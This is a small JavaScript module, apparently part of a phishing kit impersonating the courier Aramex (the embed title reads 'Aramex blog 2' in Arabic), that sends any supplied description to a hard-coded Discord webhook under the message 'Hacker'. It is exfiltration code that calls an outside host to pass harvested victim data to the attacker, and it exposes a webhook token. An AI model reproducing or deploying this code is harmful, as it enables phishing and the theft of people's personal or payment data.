import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326264729202593913/QZ72Hqr0NNQFNTO6-p37cLkz8odxLG2HJ5k3RJ9hqhIrIQNF0svxMHvzboNAUiJXLV0d",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
